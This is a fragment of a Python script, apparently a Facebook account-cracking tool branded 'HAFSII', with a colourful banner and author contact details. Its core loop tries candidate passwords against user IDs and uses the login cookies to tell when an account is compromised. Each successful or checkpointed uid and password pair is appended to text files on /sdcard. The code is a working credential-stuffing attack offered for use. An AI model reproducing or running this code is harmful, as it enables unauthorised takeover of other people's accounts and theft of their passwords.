...
for x in range(10):
    ...
    l='Mobile WVGA SMM-- HAFSII/1.2.0 OPN-B'
...
logo ="""  \033[1;92m 
.s    s.  .s5SSSs.  .s5SSSs. .s5SSSs.  s.  s.  
      SS.       SS.                SS. SS. SS. 
sS    S%S sS    S%S sS       sS    `:; S%S S%S 
SS    S%S SS    S%S SS       SS        S%S S%S 
SSSs. S%S SSSs. S%S SSSs.    `:;;;;.   S%S S%S 
...
\033[1;97m====================================================
\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92mHAFSII
\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mNOT AVALIABLE
\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+9204******5
\033[1;97m====================================================
\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY Q.HAFSII ]\x1b[00;1m\x1b[31;1m
\033[1;97m===================================================="""
clear()
os.system("xdg-open https://www.facebook.com/fazir.khnmb")
xxxx = str(len(ugen))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/HAFSII-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mCHECKPOINT\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                    open('/sdcard/HAFSII-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[- HAFSII] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
